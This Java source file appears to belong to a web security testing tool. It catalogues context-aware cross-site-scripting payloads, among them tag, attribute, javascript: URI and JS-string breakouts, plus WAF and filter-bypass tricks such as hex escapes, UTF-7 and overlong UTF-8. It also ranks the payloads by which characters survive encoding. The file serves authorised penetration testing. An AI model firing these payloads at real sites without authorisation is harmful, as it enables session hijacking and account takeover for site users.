package com.victor.reconloop;

import com.victor.reconloop.XssReflectionEngine.Context;

import java.util.*;

/**
 * Curated, context-aware cross-site-scripting vector catalogue.
 *
 * <p>The vectors and bypass notes are distilled from the PortSwigger XSS cheat sheet. Each
 * {@link Vector} declares the reflection {@link Context}s it applies to and the metacharacters that
 * must survive unencoded for it to fire, so {@link XssReflectionEngine} can surface only the
 * vectors that are actually viable for an observed sink rather than a flat wordlist.
 *
 * <p>Nothing here is fired automatically. The catalogue is advisory: it turns a passively observed
 * reflection into a ranked, copy-pasteable set of proof-of-concept payloads for manual testing
 * against authorised targets.
 */
final class XssVectorLibrary {

    /** {@code {POC}} is replaced with the proof-of-concept expression when rendered. */
    static final String POC = "alert(document.domain)";

    record Vector(String title, String payload, String requires, String note, Set<Context> contexts) {
        String rendered() { return payload.replace("{POC}", POC); }

        String contextLabel() {
            if (contexts.isEmpty()) return "any / filter-bypass";
            List<String> names = new ArrayList<>();
            for (Context c : contexts) names.add(c.name());
            Collections.sort(names);
            return String.join(", ", names);
        }
    }

    private static Vector v(String title, String payload, String requires, String note, Context... contexts) {
        return new Vector(title, payload, requires, note,
                contexts.length == 0 ? Set.of() : EnumSet.copyOf(Arrays.asList(contexts)));
    }

    static final List<Vector> VECTORS = List.of(
            // ----- HTML element text (need < and >) -----
            v("SVG onload (no interaction, short)", "<svg onload={POC}>", "<>",
                    "Fires without user interaction; one of the shortest reliable body vectors.",
                    Context.HTML_TEXT, Context.HTML_COMMENT),
            v("Image onerror (no interaction)", "<img src=x onerror={POC}>", "<>",
                    "Broken image source triggers onerror immediately.",
                    Context.HTML_TEXT, Context.HTML_COMMENT),
            v("Classic script element", "<script>{POC}</script>", "<>",
                    "Blocked by most CSP; useful when no CSP is present.",
                    Context.HTML_TEXT, Context.HTML_COMMENT),
            v("Video/source onerror", "<video><source onerror={POC}>", "<>",
                    "Media error handler; survives some tag allow-lists that miss <source>.",
                    Context.HTML_TEXT),
            v("Details ontoggle (no interaction)", "<details open ontoggle={POC}>", "<>",
                    "open attribute fires ontoggle on parse without a click.",
                    Context.HTML_TEXT),
            v("Marquee onstart", "<marquee onstart={POC}>", "<>",
                    "Legacy element, occasionally slips past modern tag filters.",
                    Context.HTML_TEXT),

            // ----- HTML comment breakout -----
            v("Close comment then inject", "--><svg onload={POC}>", "<>",
                    "Terminate the comment with --> before the tag.",
                    Context.HTML_COMMENT),

            // ----- RCDATA (title / textarea) -----
            v("Close RCDATA then inject", "</textarea><svg onload={POC}>", "<>",
                    "Inside <title>/<textarea> the parser needs the matching close tag first; swap for </title> as needed.",
                    Context.RCDATA),

            // ----- Double-quoted attribute -----
            v("Break double-quoted attribute", "\"><svg onload={POC}>", "\"<>",
                    "Close the value and tag, then inject a fresh element.",
                    Context.HTML_ATTR_DOUBLE),
            v("Stay in tag: autofocus/onfocus", "\" autofocus onfocus={POC} x=\"", "\"",
                    "No new tag needed; autofocus triggers onfocus when > is filtered.",
                    Context.HTML_ATTR_DOUBLE),
            v("Stay in tag: onmouseover", "\" onmouseover={POC} x=\"", "\"",
                    "Adds an event handler to the current element (needs interaction).",
                    Context.HTML_ATTR_DOUBLE),

            // ----- Single-quoted attribute -----
            v("Break single-quoted attribute", "'><svg onload={POC}>", "'<>",
                    "Close the value and tag, then inject a fresh element.",
                    Context.HTML_ATTR_SINGLE),
            v("Stay in tag: autofocus/onfocus", "' autofocus onfocus={POC} x='", "'",
                    "No new tag needed; autofocus triggers onfocus when > is filtered.",
                    Context.HTML_ATTR_SINGLE),

            // ----- Unquoted attribute -----
            v("Unquoted event handler", " autofocus onfocus={POC} ", "=",
                    "Whitespace then a new attribute; no quote to break out of.",
                    Context.HTML_ATTR_UNQUOTED),
            v("Slash-separated handler", "/onmouseover={POC}", "=/",
                    "A / can separate attributes when space is filtered.",
                    Context.HTML_ATTR_UNQUOTED),

            // ----- URL attribute (href/src/action) -----
            v("javascript: URI", "javascript:{POC}", ":",
                    "Direct scheme injection into href/src/action.",
                    Context.URL_ATTRIBUTE),
            v("Case-insensitive scheme", "JaVaScript:{POC}", ":",
                    "Scheme matching is case-insensitive; defeats naive 'javascript:' filters.",
                    Context.URL_ATTRIBUTE),
            v("Leading control chars before scheme", "javascript:{POC}", ":",
                    "Bytes \\x01-\\x20 are permitted before the protocol.",
                    Context.URL_ATTRIBUTE),
            v("HTML entity inside scheme", "javascript&colon;{POC}", "",
                    "&colon;/&Tab;/&NewLine; entities are decoded inside the attribute; bypasses literal 'javascript:' checks.",
                    Context.URL_ATTRIBUTE),
            v("Decimal entity first char", "&#106;avascript:{POC}", "",
                    "Leading char as &#106; ('j') decodes to a valid scheme.",
                    Context.URL_ATTRIBUTE),
            v("data: URI (if scheme allowed)", "data:text/html,<script>{POC}</script>", ":",
                    "Works where the data: scheme is not blocked.",
                    Context.URL_ATTRIBUTE),

            // ----- Double-quoted JS string -----
            v("Break double-quoted JS string", "\";{POC}//", "\"",
                    "Close the string, run code, comment out the tail.",
                    Context.SCRIPT_STRING_DOUBLE),
            v("Arithmetic breakout (double)", "\"-{POC}-\"", "\"",
                    "Keeps the statement syntactically valid without a trailing comment.",
                    Context.SCRIPT_STRING_DOUBLE),

            // ----- Single-quoted JS string -----
            v("Break single-quoted JS string", "';{POC}//", "'",
                    "Close the string, run code, comment out the tail.",
                    Context.SCRIPT_STRING_SINGLE),
            v("WAF bypass: string concat (self)", "';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//", "'",
                    "Splits identifiers so 'alert'/'document' never appear literally.",
                    Context.SCRIPT_STRING_SINGLE),
            v("WAF bypass: comment syntax", "';self[/*x*/'alert'/*y*/](self['document']['domain']);//", "'",
                    "Inline /* */ comments break signature matching on 'alert'.",
                    Context.SCRIPT_STRING_SINGLE),
            v("WAF bypass: hex escapes", "';self['\\x61\\x6c\\x65\\x72\\x74'](self['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//", "'",
                    "Hex escape sequences hide 'alert'/'document'/'domain' from filters.",
                    Context.SCRIPT_STRING_SINGLE),

            // ----- Template literal -----
            v("Template literal expression", "${{POC}}", "${}",
                    "Inside a backtick string the ${...} expression executes.",
                    Context.SCRIPT_TEMPLATE),

            // ----- Raw script block -----
            v("Direct expression", "{POC}", "",
                    "Value lands directly in code; no quoting to escape.",
                    Context.SCRIPT_BLOCK),
            v("Arithmetic breakout", "-{POC}-", "",
                    "Wrap in arithmetic to stay syntactically valid.",
                    Context.SCRIPT_BLOCK),
            v("Block breakout", "}{POC}{", "{}",
                    "Close and reopen a block when the value sits inside braces.",
                    Context.SCRIPT_BLOCK),

            // ----- Style block -----
            v("Break out of <style>", "</style><svg onload={POC}>", "<>",
                    "Close the style element before injecting.",
                    Context.STYLE_BLOCK)
    );

    /** Context-agnostic filter/encoding/WAF bypass techniques from the cheat sheet. */
    static final List<Vector> TIPS = List.of(
            v("UTF-7 charset injection", "<meta charset=\"UTF-7\">+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "",
                    "If you influence the charset (or sniffing is on), UTF-7 encodes < > / as +ADw- +AD4- and slips past < filters."),
            v("Overlong UTF-8 for <", "%C0%BCscript>alert(1)</script>", "",
                    "Overlong encodings of '<' (%C0%BC, %E0%80%BC, ...) may bypass byte-level filters on lenient decoders."),
            v("JS unicode escape in identifier", "<script>\\u0061lert(1)</script>", "",
                    "\\u0061 / \\u{61} inside script decodes to 'a', reconstructing 'alert' past keyword filters."),
            v("HTML-encode inside script", "<svg><script>&#97;lert(1)</script></svg>", "",
                    "Inside SVG <script> the parser HTML-decodes entities, so &#97; becomes 'a'."),
            v("Mixed/upper case tags & handlers", "<sVg OnLoAd=alert(1)>", "",
                    "Tag and event-handler names are case-insensitive; randomise case against naive string filters."),
            v("Whitespace/newline splitting", "<img src=x\\nonerror=alert(1)>", "",
                    "\\x09/\\x0a/\\x0d between attributes and inside the javascript: scheme are tolerated by parsers.")
    );

    private static final int MAX_SUGGESTIONS = 6;

    /** Vectors viable for {@code context} given the set of characters that survived unencoded. */
    static List<Vector> suggest(Context context, String survivingChars) {
        String surviving = survivingChars == null ? "" : survivingChars;
        List<Vector> matches = new ArrayList<>();
        for (Vector vector : VECTORS) {
            if (!vector.contexts().contains(context)) continue;
            if (!charsAvailable(vector.requires(), surviving)) continue;
            matches.add(vector);
            if (matches.size() >= MAX_SUGGESTIONS) break;
        }
        return matches;
    }

    static List<Vector> all() {
        List<Vector> combined = new ArrayList<>(VECTORS);
        combined.addAll(TIPS);
        return List.copyOf(combined);
    }

    private static boolean charsAvailable(String required, String surviving) {
        if (required == null || required.isEmpty()) return true;
        for (int i = 0; i < required.length(); i++) {
            char c = required.charAt(i);
            if (c == ' ') continue;
            if (surviving.indexOf(c) < 0) return false;
        }
        return true;
    }

    private XssVectorLibrary() {}
}
